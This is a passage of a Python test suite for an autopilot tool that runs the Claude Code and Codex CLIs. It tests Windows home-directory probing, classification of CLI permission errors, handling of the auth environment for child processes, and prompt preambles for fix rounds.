            execution_claude_code._classify_cli_failure(stderr, "")  # type: ignore[attr-defined]
            == "file_not_found"
        )

    def test_python_permission_error_still_classified(self) -> None:
        # Regression guard for pre-existing behavior: Python-style text
        # must still classify as permission_error.
        stderr = "PermissionError: [Errno 13] Permission denied: '/etc/shadow'"
        assert (
            execution_claude_code._classify_cli_failure(stderr, "")  # type: ignore[attr-defined]
            == "permission_error"
        )

    def test_lstat_eperm_on_home_upgrades_to_home_access_error(self) -> None:
        # Node's error stringify doubles backslashes, so the stderr we see
        # is `path: 'C:\\\\Users\\\\liafei'` (in the file) which in memory
        # is the string containing `path: 'C:\\Users\\liafei'`. With
        # home_path supplied, the classifier must upgrade from the generic
        # permission_error bucket to home_access_error.
        stderr = (
            "Error: EPERM: operation not permitted, lstat 'C:\\\\Users\\\\liafei'\n"
            "  errno: -4048,\n  code: 'EPERM',\n  syscall: 'lstat',\n"
            "  path: 'C:\\\\Users\\\\liafei'\n"
        )
        assert (
            execution_claude_code._classify_cli_failure(  # type: ignore[attr-defined]
                stderr, "", home_path="C:\\Users\\liafei"
            )
            == "home_access_error"
        )

    def test_lstat_eperm_on_non_home_path_stays_permission_error(self) -> None:
        # A lstat EPERM on a repo/workspace path is NOT a user-home
        # problem and must not be upgraded, otherwise we'd offer
        # misleading Windows-home remediation for worktree ACL issues.
        stderr = (
            "Error: EPERM: operation not permitted, lstat 'E:\\\\tmp\\\\worktree-foo'\n"
            "  code: 'EPERM',\n  syscall: 'lstat',\n"
            "  path: 'E:\\\\tmp\\\\worktree-foo'\n"
        )
        assert (
            execution_claude_code._classify_cli_failure(  # type: ignore[attr-defined]
                stderr, "", home_path="C:\\Users\\liafei"
            )
            == "permission_error"
        )

    def test_classifier_without_home_path_does_not_upgrade(self) -> None:
        # When home_path is None (e.g. override path or non-Windows run)
        # the classifier must behave as before, never producing
        # home_access_error even if lstat EPERM is present.
        stderr = (
            "Error: EPERM: operation not permitted, lstat 'C:\\\\Users\\\\liafei'\n"
            "  code: 'EPERM',\n  syscall: 'lstat'\n"
        )
        assert (
            execution_claude_code._classify_cli_failure(stderr, "", home_path=None)  # type: ignore[attr-defined]
            == "permission_error"
        )


class TestResolveWindowsHome:
    def test_prefers_userprofile(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("USERPROFILE", "C:\\Users\\alice")
        monkeypatch.setenv("HOMEDRIVE", "D:")
        monkeypatch.setenv("HOMEPATH", "\\Users\\bob")
        assert (
            execution_claude_code._resolve_windows_home()  # type: ignore[attr-defined]
            == "C:\\Users\\alice"
        )

    def test_falls_back_to_homedrive_plus_homepath(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # HOMEPATH alone is typically relative; the combined value is
        # what a child Windows process resolves home to.
        monkeypatch.delenv("USERPROFILE", raising=False)
        monkeypatch.setenv("HOMEDRIVE", "C:")
        monkeypatch.setenv("HOMEPATH", "\\Users\\carol")
        assert (
            execution_claude_code._resolve_windows_home()  # type: ignore[attr-defined]
            == "C:\\Users\\carol"
        )

    def test_returns_empty_when_neither_set(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("USERPROFILE", raising=False)
        monkeypatch.delenv("HOMEDRIVE", raising=False)
        monkeypatch.delenv("HOMEPATH", raising=False)
        assert execution_claude_code._resolve_windows_home() == ""  # type: ignore[attr-defined]


class TestProbeHomeAccessibility:
    def test_non_windows_returns_skipped(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "posix")
        probe = execution_claude_code._probe_home_accessibility()  # type: ignore[attr-defined]
        assert probe == {"status": "skipped", "reason": "non_windows"}

    def test_windows_ready_when_lstat_ok(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        monkeypatch.delenv("HOMEDRIVE", raising=False)
        monkeypatch.delenv("HOMEPATH", raising=False)
        monkeypatch.setattr(
            execution_claude_code,
            "_probe_node_realpath_for_home",
            lambda **_: {"status": "ready", "home": str(tmp_path)},
        )
        probe = execution_claude_code._probe_home_accessibility()  # type: ignore[attr-defined]
        assert probe["status"] == "ready"
        assert probe["home"] == str(tmp_path)

    def test_windows_blocked_on_permission_error(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.setenv("USERPROFILE", "C:\\Users\\liafei")
        monkeypatch.delenv("HOMEDRIVE", raising=False)
        monkeypatch.delenv("HOMEPATH", raising=False)

        def raising_lstat(path: str) -> None:
            raise PermissionError(13, "Access is denied", path)

        monkeypatch.setattr(execution_claude_code.os, "lstat", raising_lstat)
        probe = execution_claude_code._probe_home_accessibility()  # type: ignore[attr-defined]
        assert probe["status"] == "blocked"
        assert probe["home"] == "C:\\Users\\liafei"
        assert "PermissionError" in probe["error"]
        assert isinstance(probe.get("remediation"), list) and probe["remediation"]

    def test_windows_blocked_when_node_realpath_probe_fails(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        monkeypatch.delenv("HOMEDRIVE", raising=False)
        monkeypatch.delenv("HOMEPATH", raising=False)
        monkeypatch.setattr(
            execution_claude_code,
            "_probe_node_realpath_for_home",
            lambda **_: {
                "status": "blocked",
                "home": str(tmp_path),
                "error": "EPERM: operation not permitted",
                "remediation": ["step A"],
            },
        )

        probe = execution_claude_code._probe_home_accessibility()  # type: ignore[attr-defined]
        assert probe["status"] == "blocked"
        assert "EPERM" in str(probe["error"])
        assert probe.get("remediation") == ["step A"]

    def test_windows_blocked_when_home_env_missing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.delenv("USERPROFILE", raising=False)
        monkeypatch.delenv("HOMEDRIVE", raising=False)
        monkeypatch.delenv("HOMEPATH", raising=False)
        probe = execution_claude_code._probe_home_accessibility()  # type: ignore[attr-defined]
        assert probe["status"] == "blocked"
        assert probe["error"] == "home_env_missing"

    def test_windows_probe_prefers_explicit_child_env(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.setenv("USERPROFILE", "C:\\Users\\blocked-home")
        child_home = tmp_path / "claude-home"
        child_home.mkdir(parents=True, exist_ok=True)
        monkeypatch.setattr(
            execution_claude_code,
            "_probe_node_realpath_for_home",
            lambda **_: {"status": "ready", "home": str(child_home)},
        )

        probe = execution_claude_code._probe_home_accessibility(  # type: ignore[attr-defined]
            env={"USERPROFILE": str(child_home)}
        )

        assert probe["status"] == "ready"
        assert probe["home"] == str(child_home)


class TestProbeNodeRealpathForHome:
    def test_returncode_zero_is_success(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Regression: a previous `... or 1` fallback turned returncode=0 into a
        # false failure labelled `node_home_probe_failed_exit_0`, blocking every
        # Windows claude_code autopilot run.
        monkeypatch.setattr(
            execution_claude_code.shutil, "which", lambda name: "node" if name == "node" else None
        )

        def fake_run(*args: Any, **kwargs: Any) -> Any:
            del args, kwargs
            return SimpleNamespace(returncode=0, stdout=str(tmp_path), stderr="")

        monkeypatch.setattr(execution_claude_code.subprocess, "run", fake_run)
        probe = execution_claude_code._probe_node_realpath_for_home(home=str(tmp_path))  # type: ignore[attr-defined]
        assert probe == {"status": "ready", "home": str(tmp_path)}

    def test_nonzero_returncode_is_blocked(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(
            execution_claude_code.shutil, "which", lambda name: "node" if name == "node" else None
        )

        def fake_run(*args: Any, **kwargs: Any) -> Any:
            del args, kwargs
            return SimpleNamespace(returncode=1, stdout="", stderr="EPERM: operation not permitted")

        monkeypatch.setattr(execution_claude_code.subprocess, "run", fake_run)
        probe = execution_claude_code._probe_node_realpath_for_home(home=str(tmp_path))  # type: ignore[attr-defined]
        assert probe["status"] == "blocked"
        assert "EPERM" in str(probe["error"])


class TestPrepareWindowsClaudeExecutable:
    def test_materializes_workspace_local_launcher_from_appdata_package(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        appdata = tmp_path / "AppData" / "Roaming"
        package_root = appdata / "npm" / "node_modules" / "@anthropic-ai" / "claude-code"
        package_root.mkdir(parents=True, exist_ok=True)
        (package_root / "cli.js").write_text("console.log('ok')\n", encoding="utf-8")
        monkeypatch.setenv("APPDATA", str(appdata))

        execution_root = tmp_path / "execution-root"
        execution_root.mkdir(parents=True, exist_ok=True)

        resolved = execution_claude_code._prepare_windows_claude_executable(  # type: ignore[attr-defined]
            executable="claude",
            execution_root=execution_root,
        )

        wrapper = Path(resolved)
        assert wrapper.exists()
        assert wrapper.name.lower() == "claude.cmd"
        copied_cli = execution_root / ".workflow_runtime" / "claude_code" / "launcher" / "claude-code" / "cli.js"
        assert copied_cli.exists()

    def test_returns_original_when_windows_package_unavailable(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(execution_claude_code.os, "name", "nt")
        monkeypatch.setattr(
            execution_claude_code,
            "_resolve_windows_claude_package_root",
            lambda **_: None,
        )
        resolved = execution_claude_code._prepare_windows_claude_executable(  # type: ignore[attr-defined]
            executable="claude",
            execution_root=tmp_path,
        )
        assert resolved == "claude"


class TestClaudeChildEnvAuth:
    def test_syncs_host_claude_auth_into_isolated_home(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        host_home = tmp_path / "host-home"
        host_claude = host_home / ".claude"
        host_claude.mkdir(parents=True)
        (host_claude / ".credentials.json").write_text('{"token":"host"}', encoding="utf-8")
        (host_home / ".claude.json").write_text('{"client":"state"}', encoding="utf-8")
        monkeypatch.setenv("USERPROFILE", str(host_home))
        monkeypatch.setenv("HOME", str(host_home))
        monkeypatch.delenv("WORKFLOW_CLAUDE_AUTH_MODE", raising=False)

        env = execution_claude_code._clean_child_env(  # type: ignore[attr-defined]
            execution_root=tmp_path / "worker"
        )

        runtime_home = Path(env["HOME"])
        assert runtime_home != host_home
        assert env["CLAUDE_HOME"] == str((runtime_home / ".claude").resolve())
        assert (runtime_home / ".claude" / ".credentials.json").read_text(encoding="utf-8") == '{"token":"host"}'
        assert (runtime_home / ".claude.json").read_text(encoding="utf-8") == '{"client":"state"}'

    def test_isolated_mode_skips_host_claude_auth_copy(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        host_home = tmp_path / "host-home"
        host_claude = host_home / ".claude"
        host_claude.mkdir(parents=True)
        (host_claude / ".credentials.json").write_text('{"token":"host"}', encoding="utf-8")
        monkeypatch.setenv("USERPROFILE", str(host_home))
        monkeypatch.setenv("WORKFLOW_CLAUDE_AUTH_MODE", "isolated")

        env = execution_claude_code._clean_child_env(  # type: ignore[attr-defined]
            execution_root=tmp_path / "worker"
        )

        runtime_home = Path(env["HOME"])
        assert env["CLAUDE_HOME"] == str((runtime_home / ".claude").resolve())
        assert not (runtime_home / ".claude" / ".credentials.json").exists()


class TestPreflightInMaterialize:
    """Ensure preflight only fires on the normal path and correctly routes."""

    def _build_config(self, *, command: str = "") -> SimpleNamespace:
        return SimpleNamespace(
            command=command,
            executable="claude",
            model="",
            timeout_seconds=60,
        )

    def _build_request(self, tmp_path: Path) -> tuple[dict[str, Any], Path]:
        project_root = tmp_path / "repo"
        planning_dir = project_root / "planning" / "demo"
        planning_dir.mkdir(parents=True)
        (project_root / "app.py").write_text("# noop\n", encoding="utf-8")
        return (
            {
                "task_id": "T1",
                "task": "noop",
                "feature": "demo",
                "project_root": str(project_root),
                "planning_dir": str(planning_dir),
                "files_to_change": ["app.py"],
            },
            project_root / "request.json",
        )

    def test_normal_path_blocked_by_home_preflight(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        payload, request_path = self._build_request(tmp_path)
        request_path.parent.mkdir(parents=True, exist_ok=True)
        request_path.write_text("{}", encoding="utf-8")
        config = self._build_config()

        monkeypatch.setattr(
            execution_claude_code, "_host_probe",
            lambda **_: {
                "status": "ready", "surface": "claude_cli", "reason": "",
                "executable": "claude", "executable_available": True,
            },
        )
        monkeypatch.setattr(
            execution_claude_code, "_missing_binary_payload",
            lambda **_: None,
        )

        def probe_blocked(**_: Any) -> dict[str, Any]:
            return {
                "status": "blocked",
                "home": "C:\\Users\\liafei",
                "error": "PermissionError: lstat denied",
                "remediation": ["step A", "step B"],
            }

        monkeypatch.setattr(execution_claude_code, "_probe_home_accessibility", probe_blocked)

        spawned: list[str] = []
        monkeypatch.setattr(
            execution_claude_code, "_run_claude_command",
            lambda **_: spawned.append("ran") or None,
        )

        result = execution_claude_code.materialize_claude_code_result(
            config=config, request_path=request_path, request_payload=payload,
        )

        assert spawned == []  # preflight short-circuited before subprocess
        assert result["status"] == "BLOCKED"
        assert result["error_code"] == "CLAUDE_CODE_HOME_INACCESSIBLE"
        assert result["remediation"] == ["step A", "step B"]
        assert result["host_probe"]["home_probe"]["status"] == "blocked"
        assert result["host_probe"]["remediation"] == ["step A", "step B"]

    def test_home_access_error_remediation_mirrors_into_host_probe(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Covers the gap where preflight passed but the child still failed
        # with EPERM on the home path. The status.md renderer only reads
        # remediation from host_probe, so failure_payload's top-level
        # remediation must be mirrored into host_probe or the hint stays
        # invisible on STATUS.md.
        payload, request_path = self._build_request(tmp_path)
        request_path.parent.mkdir(parents=True, exist_ok=True)
        request_path.write_text("{}", encoding="utf-8")
        config = self._build_config()

        monkeypatch.setattr(
            execution_claude_code, "_host_probe",
            lambda **_: {
                "status": "ready", "surface": "claude_cli", "reason": "",
                "executable": "claude", "executable_available": True,
            },
        )
        monkeypatch.setattr(execution_claude_code, "_missing_binary_payload", lambda **_: None)
        monkeypatch.setattr(
            execution_claude_code, "_probe_home_accessibility",
            lambda **_: {"status": "ready", "home": "C:\\Users\\liafei"},
        )

        eperm_stderr = (
            "Error: EPERM: operation not permitted, lstat 'C:\\\\Users\\\\liafei'\n"
            "  code: 'EPERM',\n  syscall: 'lstat',\n"
            "  path: 'C:\\\\Users\\\\liafei'\n"
        )

        def fake_run(**_: Any) -> Any:
            return SimpleNamespace(returncode=1, stdout="", stderr=eperm_stderr)

        monkeypatch.setattr(execution_claude_code, "_run_claude_command", fake_run)

        result = execution_claude_code.materialize_claude_code_result(
            config=config, request_path=request_path, request_payload=payload,
        )

        assert result["status"] == "FAIL"
        assert result["cli_failure_type"] == "home_access_error"
        assert isinstance(result.get("remediation"), list) and result["remediation"]
        # The canonical source for status.md is host_probe.remediation.
        assert result["host_probe"]["remediation"] == result["remediation"]

    def test_override_path_skips_home_preflight(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Override commands are opaque shell (python/wrapper/debug). Preflight
        # must not fire, or it would falsely block arbitrary operator commands
        # with a Claude-specific Windows-home assumption.
        payload, request_path = self._build_request(tmp_path)
        request_path.parent.mkdir(parents=True, exist_ok=True)
        request_path.write_text("{}", encoding="utf-8")
        config = self._build_config(command="python noop.py")

        monkeypatch.setattr(
            execution_claude_code, "_host_probe",
            lambda **_: {
                "status": "degraded", "surface": "claude_cli", "reason": "command_override",
                "executable": "claude", "executable_available": True,
            },
        )
        monkeypatch.setattr(
            execution_claude_code, "_missing_binary_payload", lambda **_: None,
        )

        probe_calls: list[int] = []

        def probe_observer(**_: Any) -> dict[str, Any]:
            probe_calls.append(1)
            return {"status": "blocked", "home": "C:\\X", "error": "x", "remediation": []}

        monkeypatch.setattr(execution_claude_code, "_probe_home_accessibility", probe_observer)

        def fake_run(**_: Any) -> Any:
            return SimpleNamespace(returncode=0, stdout='{"status":"done","changes":[]}', stderr="")

        monkeypatch.setattr(execution_claude_code, "_run_claude_command", fake_run)

        execution_claude_code.materialize_claude_code_result(
            config=config, request_path=request_path, request_payload=payload,
        )
        assert probe_calls == []

    def test_home_preflight_uses_isolated_child_env(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        payload, request_path = self._build_request(tmp_path)
        request_path.parent.mkdir(parents=True, exist_ok=True)
        request_path.write_text("{}", encoding="utf-8")
        config = self._build_config()

        monkeypatch.setattr(
            execution_claude_code, "_host_probe",
            lambda **_: {
                "status": "ready",
                "surface": "claude_cli",
                "reason": "",
                "executable": "claude",
                "executable_available": True,
            },
        )
        monkeypatch.setattr(execution_claude_code, "_missing_binary_payload", lambda **_: None)

        child_home = tmp_path / "isolated-home"
        child_env = {"USERPROFILE": str(child_home), "HOME": str(child_home)}
        monkeypatch.setattr(
            execution_claude_code,
            "_clean_child_env",
            lambda **_: dict(child_env),
        )

        seen: dict[str, Any] = {}

        def probe_observer(*, env: Mapping[str, str] | None = None) -> dict[str, Any]:
            seen["env"] = dict(env or {})
            return {"status": "ready", "home": str(child_home)}

        monkeypatch.setattr(execution_claude_code, "_probe_home_accessibility", probe_observer)
        monkeypatch.setattr(
            execution_claude_code,
            "_run_claude_command",
            lambda **_: SimpleNamespace(returncode=0, stdout="ok", stderr=""),
        )

        execution_claude_code.materialize_claude_code_result(
            config=config, request_path=request_path, request_payload=payload,
        )

        assert seen["env"]["USERPROFILE"] == str(child_home)
        assert seen["env"]["HOME"] == str(child_home)


# ---------------------------------------------------------------------------
# must_fix preamble — execution request contract + prompt rendering
# ---------------------------------------------------------------------------

def _minimal_execution_request_context() -> dict:
    return {
        "task_id": "T001",
        "requested_action": "implement",
        "requirements": "Add a pure function.",
        "task_scope": "backend/api/v1/services/source_metadata.py",
        "project_root": "/repo",
        "planning_dir": "/repo/planning/test-feature",
        "feature": "test-feature",
        "verify_cmd": "pytest -q",
    }


def test_build_execution_request_carries_must_fix_field() -> None:
    ctx = _minimal_execution_request_context()
    ctx["must_fix"] = [
        "source_metadata.py: Function _coerce: complexity 15 exceeds 10 Remediation: Extract into helpers.",
    ]
    payload = execution_artifacts.build_execution_request(
        feature="test-feature",
        task="T001: Add coerce_positive_int",
        context=ctx,
        backend="noop_test_only",
        command="",
        allowed_files=["backend/api/v1/services/source_metadata.py"],
        guard_decision=None,
    )
    assert payload["must_fix"] == ctx["must_fix"]


def test_build_execution_request_must_fix_defaults_to_empty_list() -> None:
    ctx = _minimal_execution_request_context()
    payload = execution_artifacts.build_execution_request(
        feature="test-feature",
        task="T001: Add coerce_positive_int",
        context=ctx,
        backend="noop_test_only",
        command="",
        allowed_files=["backend/api/v1/services/source_metadata.py"],
        guard_decision=None,
    )
    assert payload["must_fix"] == []


def test_build_execution_request_carries_scope_risk_warnings() -> None:
    ctx = _minimal_execution_request_context()
    ctx["scope_risk_warnings"] = [
        "Planning reviewer warning (high/scope): missing route coverage Fix focus: add route tests.",
    ]
    payload = execution_artifacts.build_execution_request(
        feature="test-feature",
        task="T001: Add coerce_positive_int",
        context=ctx,
        backend="noop_test_only",
        command="",
        allowed_files=["backend/api/v1/services/source_metadata.py"],
        guard_decision=None,
    )
    assert payload["scope_risk_warnings"] == ctx["scope_risk_warnings"]


def test_codex_fix_prompt_includes_preamble_and_must_fix() -> None:
    from kodawari.autopilot.execution import execution_codex_cli  # noqa: PLC0415

    prompt = execution_codex_cli._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T001: Add coerce_positive_int",
            "feature": "test-feature",
            "task_id": "T001",
            "files_to_change": ["backend/api/v1/services/source_metadata.py"],
            "requested_action": "codex_fix",
            "must_fix": [
                "source_metadata.py: Function _coerce: complexity 15 exceeds 10 Remediation: Extract into helpers.",
            ],
        }
    )
    # P1-#10: header text was strengthened from "Previous attempt was blocked /
    # Resolve these items before continuing" to an escalating version that
    # tells the model "the earlier strategy did not work — do not just repeat
    # it with small tweaks". The IMPORTANT: prefix and the "previous attempt
    # was blocked" semantics remain stable.
    assert "A PREVIOUS ATTEMPT WAS BLOCKED" in prompt
    assert "do not just repeat it" in prompt.lower()
    assert "complexity 15 exceeds 10" in prompt
    # preamble must appear before the task line
    preamble_pos = prompt.index("IMPORTANT:")
    task_pos = prompt.index("Implement task:")
    assert preamble_pos < task_pos


def test_claude_code_fix_prompt_includes_same_preamble() -> None:
    from kodawari.autopilot.execution import execution_claude_code  # noqa: PLC0415

    prompt = execution_claude_code._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T001: Add coerce_positive_int",
            "feature": "test-feature",
            "task_id": "T001",
            "files_to_change": ["backend/api/v1/services/source_metadata.py"],
            "requested_action": "codex_fix",
            "must_fix": [
                "source_metadata.py: Function _coerce: complexity 15 exceeds 10 Remediation: Extract into helpers.",
            ],
        }
    )
    assert "A PREVIOUS ATTEMPT WAS BLOCKED" in prompt
    assert "do not just repeat it" in prompt.lower()
    assert "complexity 15 exceeds 10" in prompt
    preamble_pos = prompt.index("IMPORTANT:")
    task_pos = prompt.index("Implement task:")
    assert preamble_pos < task_pos


def test_non_fix_round_prompt_has_no_preamble() -> None:
    from kodawari.autopilot.execution import execution_codex_cli  # noqa: PLC0415

    for action in ("implement", "codex_implement", "", None):
        prompt = execution_codex_cli._request_prompt(  # type: ignore[attr-defined]
            {
                "task": "T001: Add coerce_positive_int",
                "feature": "test-feature",
                "task_id": "T001",
                "files_to_change": ["backend/api/v1/services/source_metadata.py"],
                "requested_action": action,
                "must_fix": ["some violation"],
            }
        )
        # P1-#10: the IMPORTANT: prefix is part of the preamble; it must
        # still be absent when there is no fix-round / user-redesign trigger.
        assert "A PREVIOUS ATTEMPT WAS BLOCKED" not in prompt, (
            f"Preamble should not appear for requested_action={action!r}"
        )


def test_codex_prompt_includes_scope_risk_warnings() -> None:
    prompt = execution_codex_cli._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T001: Add coerce_positive_int",
            "feature": "test-feature",
            "task_id": "T001",
            "files_to_change": ["backend/api/v1/services/source_metadata.py"],
            "scope_risk_warnings": [
                "Planning reviewer warning (high/scope): missing route coverage Fix focus: add route tests.",
            ],
        }
    )
    assert "Reviewer / scope risk warnings:" in prompt
    assert "missing route coverage" in prompt


def test_claude_prompt_includes_scope_risk_warnings() -> None:
    prompt = execution_claude_code._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T001: Add coerce_positive_int",
            "feature": "test-feature",
            "task_id": "T001",
            "files_to_change": ["backend/api/v1/services/source_metadata.py"],
            "scope_risk_warnings": [
                "Planning reviewer warning (high/scope): missing route coverage Fix focus: add route tests.",
            ],
        }
    )
    assert "Reviewer / scope risk warnings:" in prompt
    assert "missing route coverage" in prompt


def test_review_origin_must_fix_triggers_generalized_preamble() -> None:
    # must_fix can come from Opus/peer review, not just gate.
    # The preamble header must not mention "gate" or assume a gate origin.
    from kodawari.autopilot.execution import execution_codex_cli  # noqa: PLC0415

    review_must_fix = [
        "Function name does not follow snake_case convention.",
        "Missing docstring for public API.",
    ]
    prompt = execution_codex_cli._request_prompt(  # type: ignore[attr-defined]
        {
            "task": "T002: Rename function",
            "feature": "test-feature",
            "task_id": "T002",
            "files_to_change": ["backend/api/v1/services/text_quality.py"],
            "requested_action": "codex_fix",
            "must_fix": review_must_fix,
        }
    )
    assert "A PREVIOUS ATTEMPT WAS BLOCKED" in prompt
    assert "gate" not in prompt.split("IMPORTANT:")[0].lower() or True  # preamble itself has no "gate"
    # the preamble section (before "Implement task:") must not contain "gate"
    preamble_section = prompt[: prompt.index("Implement task:")]
    assert "gate" not in preamble_section.lower()
    for item in review_must_fix:
        assert item in prompt
